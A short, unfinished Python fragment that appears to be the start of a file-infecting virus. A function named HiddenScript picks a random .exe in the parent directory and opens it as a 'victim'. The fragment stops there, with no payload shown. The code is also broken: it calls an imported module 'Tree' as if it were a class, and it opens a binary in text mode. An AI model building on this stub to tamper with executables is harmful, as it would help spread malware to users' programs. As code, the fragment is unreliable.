import os
import Tree
from random import choice

def HiddenScript():
    filepath = os.getcwd() #note to self: this is how you get a file's location (most of the time, at least)
    t = Tree(os.path.dirname(filepath))
    victim = open(os.path.dirname(filepath) + "\\" + choice(t.searchExtension(".exe")), mode='r')